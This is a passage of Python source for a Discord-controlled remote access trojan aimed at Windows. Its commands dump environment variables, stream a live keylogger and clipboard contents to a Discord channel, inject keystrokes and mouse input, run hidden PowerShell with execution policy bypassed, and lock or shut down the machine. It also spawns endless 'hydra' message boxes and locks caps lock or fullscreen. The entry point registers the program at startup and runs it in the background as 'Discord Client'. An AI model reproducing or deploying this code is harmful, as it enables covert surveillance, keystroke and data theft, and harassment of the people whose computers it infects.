@commands.is_owner()
async def env(ctx):
    if not await check_channel(ctx):
        return
    try:
        env_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
        msg = f"Environment Variables ({len(os.environ)} total):\n{env_vars}"
        await send_long_message(ctx, msg, codeblock=True)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def pythonpath(ctx):
    if not await check_channel(ctx):
        return
    try:
        if not sys.path:
            await ctx.send("No paths found in `sys.path`.")
            return

        paths = "\n".join(sys.path)
        msg = f"Python Path (`sys.path`) - {len(sys.path)} entries:\n{paths}"
        
        # Use helper to split into multiple messages if too long
        await send_long_message(ctx, msg, codeblock=True)
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def who(ctx):
    if not await check_channel(ctx):
        return
    try:
        output = subprocess.check_output(['quser'], text=True, stderr=subprocess.STDOUT)
        await ctx.send(f"```\n{output.strip()}\n```")
    except:
        await ctx.send("quser not available or error.")

@bot.command(aliases=["openweb", "browse"])
@commands.is_owner()
async def website(ctx, url: str):
    if not await check_channel(ctx):
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    try:
        webbrowser.open(url)
        await ctx.send(f"Opened: **{url}**")
    except Exception as e:
        await ctx.send(f"Failed: {str(e)}")

@bot.command()
@commands.is_owner()
async def lock(ctx):
    if not await check_channel(ctx):
        return
    try:
        ctypes.windll.user32.LockWorkStation()
        await ctx.send("Workstation locked.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def shutdown(ctx, seconds: int = 60):
    if not await check_channel(ctx):
        return
    try:
        subprocess.run(f"shutdown /s /t {seconds}", shell=True)
        await ctx.send(f"Shutdown in **{seconds}** seconds. Use !cancelshutdown to abort.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def cancelshutdown(ctx):
    if not await check_channel(ctx):
        return
    try:
        subprocess.run("shutdown /a", shell=True)
        await ctx.send("Shutdown cancelled.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def restart(ctx):
    if not await check_channel(ctx):
        return
    try:
        subprocess.run("shutdown /r /t 0", shell=True)
        await ctx.send("Restarting...")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def logoff(ctx):
    if not await check_channel(ctx):
        return
    try:
        subprocess.run("shutdown /l", shell=True)
        await ctx.send("Logging off...")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def keylogger(ctx, action: str):
    if not await check_channel(ctx):
        return
    global keylog_active, keylog_buffer, keylog_channel
    action = action.lower().strip()
    if action == "start":
        if keylog_active:
            await ctx.send("Keylogger already active.")
            return
        keylog_channel = ctx.channel
        try:
            threading.Thread(target=start_keylogger_internal, daemon=True).start()
            await ctx.send("**Keylogger STARTED** - every key sent here live. Stop with !keylogger stop")
        except Exception as e:
            keylog_channel = None
            await ctx.send(f"Failed: {str(e)}")
    elif action == "stop":
        if not keylog_active:
            await ctx.send("Keylogger not running.")
            return
        stop_keylogger_internal()
        keylog_channel = None
        await ctx.send("**Keylogger STOPPED**")
    elif action == "status":
        status = "Active" if keylog_active else "Stopped"
        await ctx.send(f"Status: **{status}** | Keys captured: **{len(keylog_buffer)}**")
    else:
        await ctx.send("Usage: !keylogger start / stop / status")

@bot.command()
@commands.is_owner()
async def write(ctx, *, text: str):
    if not await check_channel(ctx):
        return
    try:
        pyautogui.typewrite(text, interval=0.05)
        await ctx.send(f"Typed: `{text}`")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def typefast(ctx, *, text: str):
    if not await check_channel(ctx):
        return
    try:
        pyautogui.typewrite(text, interval=0.01)
        await ctx.send(f"Typed fast: `{text}`")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def press(ctx, *, key: str):
    if not await check_channel(ctx):
        return
    try:
        pyautogui.press(key)
        await ctx.send(f"Pressed: `{key}`")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def click(ctx):
    if not await check_channel(ctx):
        return
    try:
        pyautogui.click()
        await ctx.send("Clicked.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def mousepos(ctx, x: int, y: int):
    if not await check_channel(ctx):
        return
    try:
        pyautogui.moveTo(x, y, duration=0.5)
        await ctx.send(f"Mouse moved to **({x}, {y})**")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def mousefollow(ctx, state: str):
    if not await check_channel(ctx):
        return
    global mouse_follow_active
    if state.lower() == "on":
        if mouse_follow_active:
            await ctx.send("Mouse follow already active.")
            return
        mouse_follow_active = True
        await ctx.send("Mouse follow ON. Send !mousefollow off to stop.")
        while mouse_follow_active:
            try:
                x, y = pyautogui.position()
                pyautogui.moveTo(x, y)
                await asyncio.sleep(0.1)
            except:
                break
    elif state.lower() == "off":
        mouse_follow_active = False
        await ctx.send("Mouse follow OFF.")
    else:
        await ctx.send("Usage: !mousefollow on/off")

@bot.command()
@commands.is_owner()
async def shake(ctx, state: str):
    if not await check_channel(ctx):
        return
    global shake_active
    if state.lower() == "on":
        if shake_active:
            await ctx.send("Shake already active.")
            return
        shake_active = True
        threading.Thread(target=shake_loop, daemon=True).start()
        await ctx.send("**Cursor shake ON** - use `!shake off` to stop.")
    elif state.lower() == "off":
        if not shake_active:
            await ctx.send("Shake is not active.")
            return
        shake_active = False
        await ctx.send("**Cursor shake OFF**")
    else:
        await ctx.send("Usage: !shake on/off")

@bot.command()
@commands.is_owner()
async def autoclick(ctx, times: int = 10, delay: float = 0.1):
    if not await check_channel(ctx):
        return
    try:
        await ctx.send(f"Auto clicking {times} times with {delay}s delay...")
        for _ in range(min(times, 500)):
            pyautogui.click()
            await asyncio.sleep(delay)
        await ctx.send("Done.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def clipboard(ctx):
    if not await check_channel(ctx):
        return
    try:
        import tkinter as tk
        root = tk.Tk()
        root.withdraw()
        content = root.clipboard_get()
        root.destroy()
        await ctx.send(f"Clipboard:\n```\n{content[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def volume(ctx, level: int):
    if not await check_channel(ctx):
        return
    if level < 0 or level > 100:
        await ctx.send("Use 0-100.")
        return
    try:
        import ctypes
        vol_word = int(level / 100 * 0xFFFF)
        vol_dword = ctypes.c_ulong(vol_word | (vol_word << 16))
        ctypes.windll.winmm.waveOutSetVolume(None, vol_dword)
        await ctx.send(f"Volume set to **{level}%**")
    except Exception as e:
        await ctx.send(f"Volume error: {str(e)}")

@bot.command()
@commands.is_owner()
async def mute(ctx):
    if not await check_channel(ctx):
        return
    try:
        import ctypes
        ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xAD, 0, 2, 0)
        await ctx.send("System muted.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def unmute(ctx):
    if not await check_channel(ctx):
        return
    try:
        import ctypes
        ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xAD, 0, 2, 0)
        await ctx.send("System unmuted.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def audio(ctx):
    if not await check_channel(ctx):
        return
    await ctx.send("Send an mp3, mp4, wav, ogg, flac or m4a file. Waiting 60s...")
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.attachments
    try:
        msg = await bot.wait_for("message", check=check, timeout=60.0)
        attach = msg.attachments[0]
        if not attach.filename.lower().endswith(('.mp3', '.mp4', '.wav', '.ogg', '.flac', '.m4a')):
            await ctx.send("Only mp3, mp4, wav, ogg, flac, m4a files.")
            return
        audio_path = os.path.join(os.path.expanduser("~"), "audio_" + str(int(time.time())) + "_" + attach.filename)
        await attach.save(audio_path)
        await ctx.send("Playing **" + attach.filename + "** in background...")
        def play_once(path):
            try:
                import pygame
                pygame.mixer.init()
                pygame.mixer.music.load(path)
                pygame.mixer.music.play(0)
                while pygame.mixer.music.get_busy():
                    time.sleep(0.1)
                pygame.mixer.quit()
            except Exception:
                try:
                    clean = path.replace("'", "")
                    ps = (
                        "Add-Type -AssemblyName presentationCore; "
                        "$p = New-Object System.Windows.Media.MediaPlayer; "
                        "$p.Open([Uri]::new('" + clean + "')); "
                        "$p.Play(); Start-Sleep -Seconds 600"
                    )
                    subprocess.Popen(
                        ["powershell", "-WindowStyle", "Hidden", "-Command", ps],
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                except:
                    pass
        threading.Thread(target=play_once, args=(audio_path,), daemon=True).start()
        await ctx.send("Audio playing on PC.")
    except asyncio.TimeoutError:
        await ctx.send("Timed out.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name="audio-loop")
@commands.is_owner()
async def audio_loop(ctx, action: str = "start"):
    if not await check_channel(ctx):
        return
    global audio_loop_active, audio_loop_path
    if action.lower() == "stop":
        if not audio_loop_active:
            await ctx.send("No audio loop is running.")
            return
        audio_loop_active = False
        audio_loop_path = None
        try:
            import pygame
            pygame.mixer.music.stop()
            pygame.mixer.quit()
        except:
            pass
        await ctx.send("Audio loop stopped.")
        return
    if audio_loop_active:
        await ctx.send("Loop already running. Use `!audio-loop stop` to stop.")
        return
    await ctx.send("Send an mp3, mp4, wav, ogg, flac or m4a file to loop. Waiting 60s...")
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.attachments
    try:
        msg = await bot.wait_for("message", check=check, timeout=60.0)
        attach = msg.attachments[0]
        if not attach.filename.lower().endswith(('.mp3', '.mp4', '.wav', '.ogg', '.flac', '.m4a')):
            await ctx.send("Only mp3, mp4, wav, ogg, flac, m4a files.")
            return
        audio_path = os.path.join(os.path.expanduser("~"), "audioloop_" + str(int(time.time())) + "_" + attach.filename)
        await attach.save(audio_path)
        audio_loop_active = True
        audio_loop_path = audio_path
        await ctx.send("Looping **" + attach.filename + "** on PC. Use `!audio-loop stop` to stop.")
        def loop_thread(path):
            global audio_loop_active
            try:
                import pygame
                pygame.mixer.init()
                pygame.mixer.music.load(path)
                pygame.mixer.music.play(-1)
                while audio_loop_active:
                    time.sleep(0.1)
                pygame.mixer.music.stop()
                pygame.mixer.quit()
                return
            except Exception:
                pass
            # Fallback: write a ps1 script that loops, run it, kill on stop
            clean = path.replace("'", "")
            ps1_path = path + "_loop.ps1"
            nl = chr(10)
            try:
                clean = path.replace("'", "")
                script = "Add-Type -AssemblyName presentationCore" + nl
                script += "while ($true) {" + nl
                script += "    $p = New-Object System.Windows.Media.MediaPlayer" + nl
                script += "    $p.Open([System.Uri]::new('" + clean + "'))" + nl
                script += "    $p.Play()" + nl
                script += "    Start-Sleep -Milliseconds 1500" + nl
                script += "    $i = 0" + nl
                script += "    while (-not $p.NaturalDuration.HasTimeSpan -and $i -lt 20) { Start-Sleep -Milliseconds 200; $i++ }" + nl
                script += "    if ($p.NaturalDuration.HasTimeSpan) { $secs = [int]$p.NaturalDuration.TimeSpan.TotalSeconds + 1 } else { $secs = 300 }" + nl
                script += "    Start-Sleep -Seconds $secs" + nl
                script += "    $p.Close()" + nl
                script += "}" + nl
                with open(ps1_path, "w") as f:
                    f.write(script)
            except Exception:
                while audio_loop_active:
                    time.sleep(1)
                return
            proc = subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", ps1_path],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            while audio_loop_active:
                time.sleep(0.2)
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except:
                pass
            try:
                os.remove(ps1_path)
            except:
                pass
                pass
        threading.Thread(target=loop_thread, args=(audio_path,), daemon=True).start()
    except asyncio.TimeoutError:
        await ctx.send("Timed out.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name="audio-stop")
@commands.is_owner()
async def audio_stop(ctx):
    if not await check_channel(ctx):
        return
    global audio_loop_active, audio_loop_path
    if not audio_loop_active:
        await ctx.send("No audio loop is running.")
        return
    audio_loop_active = False
    audio_loop_path = None
    try:
        import pygame
        pygame.mixer.music.stop()
        pygame.mixer.quit()
    except:
        pass
    await ctx.send("Audio loop stopped.")

async def messagebox(ctx, title: str, *, text: str):
    if not await check_channel(ctx):
        return
    try:
        ctypes.windll.user32.MessageBoxW(0, text, title, 1)
        await ctx.send("Messagebox shown.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def msgloop(ctx, count: str, title: str, *, text: str):
    if not await check_channel(ctx):
        return
    if count.lower() == "inf":
        await ctx.send("Starting infinite msg loop - restart bot to stop.")
        while True:
            try:
                ctypes.windll.user32.MessageBoxW(0, text, title, 0)
            except:
                pass
            await asyncio.sleep(0.05)
    else:
        try:
            num = min(int(count), 100)
            await ctx.send(f"Spamming {num} message boxes...")
            for _ in range(num):
                ctypes.windll.user32.MessageBoxW(0, text, title, 0)
            await ctx.send("Done.")
        except ValueError:
            await ctx.send("Use a number or 'inf' for count.")
        except Exception as e:
            await ctx.send(f"Error: {str(e)}")

@bot.command()
@commands.is_owner()
async def hydra(ctx, action: str = "start"):
    if not await check_channel(ctx):
        return
    global hydra_active
    action = action.lower()
    if action == "start":
        if hydra_active:
            await ctx.send("Hydra already running.")
            return
        hydra_active = True
        await ctx.send("Hydra started - close one, three more open. Use !hydra stop to end.")
        def open_hydra_msg():
            global hydra_active
            if not hydra_active:
                return
            try:
                ctypes.windll.user32.MessageBoxW(0, "Cut one, three more will take its place", "Hydra", 0)
                if hydra_active:
                    for _ in range(3):
                        threading.Thread(target=open_hydra_msg, daemon=True).start()
            except:
                pass
        threading.Thread(target=open_hydra_msg, daemon=True).start()
    elif action == "stop":
        hydra_active = False
        await ctx.send("Hydra stopped.")
    else:
        await ctx.send("Use !hydra start or !hydra stop")

@bot.command()
@commands.is_owner()
async def wallpaper(ctx):
    if not await check_channel(ctx):
        return
    await ctx.send("Send an image (jpg/png/bmp) now. Waiting 60s...")
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.attachments
    try:
        msg = await bot.wait_for("message", check=check, timeout=60.0)
        attach = msg.attachments[0]
        if not attach.filename.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp')):
            await ctx.send("Only jpg/png/bmp files.")
            return
        img_path = os.path.join(os.path.expanduser("~"), f"wallpaper_{int(time.time())}.jpg")
        await attach.save(img_path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
        await ctx.send(f"Wallpaper set to **{attach.filename}**")
    except asyncio.TimeoutError:
        await ctx.send("No image received.")
    except Exception as e:
        await ctx.send(f"Failed: {str(e)}")

@bot.command()
@commands.is_owner()
async def capslock(ctx, action: str = "on"):
    if not await check_channel(ctx):
        return
    global capslock_lock_active
    action = action.lower()
    if action == "on":
        if capslock_lock_active:
            await ctx.send("Caps Lock lock already active.")
            return
        capslock_lock_active = True
        threading.Thread(target=capslock_lock_loop, daemon=True).start()
        await ctx.send("**Caps Lock LOCKED ON** - will re-enable if turned off. Use `!capslock off` to stop.")
    elif action == "off":
        if not capslock_lock_active:
            await ctx.send("Caps Lock lock is not active.")
            return
        capslock_lock_active = False
        await ctx.send("**Caps Lock lock OFF**")
    elif action == "toggle":
        try:
            pyautogui.press('capslock')
            await ctx.send("Caps Lock toggled once.")
        except Exception as e:
            await ctx.send(f"Error: {str(e)}")
    else:
        await ctx.send("Usage: `!capslock on` / `!capslock off` / `!capslock toggle`")

@bot.command()
@commands.is_owner()
async def fullscreen(ctx, action: str = "on"):
    if not await check_channel(ctx):
        return
    global fullscreen_lock_active
    if action.lower() == "lock":
        if fullscreen_lock_active:
            await ctx.send("Fullscreen lock already active.")
            return
        fullscreen_lock_active = True
        threading.Thread(target=fullscreen_lock_loop, daemon=True).start()
        await ctx.send("**Fullscreen LOCKED** - use `!fullscreen unlock` to stop.")
    elif action.lower() == "unlock":
        if not fullscreen_lock_active:
            await ctx.send("Fullscreen lock is not active.")
            return
        fullscreen_lock_active = False
        await ctx.send("**Fullscreen UNLOCKED**")
    else:
        try:
            pyautogui.press('f11')
            await ctx.send("Pressed F11.")
        except Exception as e:
            await ctx.send(f"Error: {str(e)}")
1
@bot.command()
@commands.is_owner()
async def voice(ctx, *, text: str):
    if not await check_channel(ctx):
        return
    try:
        import pyttsx3
        def speak():
            engine = pyttsx3.init()
            engine.setProperty('rate', 150)
            engine.setProperty('volume', 1.0)
            engine.say(text)
            engine.runAndWait()
        threading.Thread(target=speak, daemon=True).start()
        await ctx.send(f"Speaking: `{text}`")
    except ImportError:
        try:
            safe_text = text.replace("'", "")
            ps_cmd = ("Add-Type -AssemblyName System.Speech; "
                      "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
                      "$s.Volume = 100; $s.Rate = 0; "
                      "$s.Speak('" + safe_text + "')")
            subprocess.Popen(["powershell", "-Command", ps_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
            await ctx.send(f"Speaking: `{text}`")
        except Exception as e:
            await ctx.send(f"Error: {str(e)}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# ====================== ENTRY POINT ======================
if __name__ == "__main__":
    # One-time setup: Add to startup + show confirmation
    setup_file = os.path.join(os.path.expanduser("~"), ".discord_client_setup")
    
    if not os.path.exists(setup_file):
        success = add_to_startup()
        if success:
            show_setup_message()
            # Create marker so it doesn't show again
            try:
                with open(setup_file, "w") as f:
                    f.write("setup_complete")
            except:
                pass
        else:
            print("[-] Startup registration failed.")
    
    # Start the Discord bot
    print("[+] Starting Discord Client in background...")
    bot.run(TOKEN)
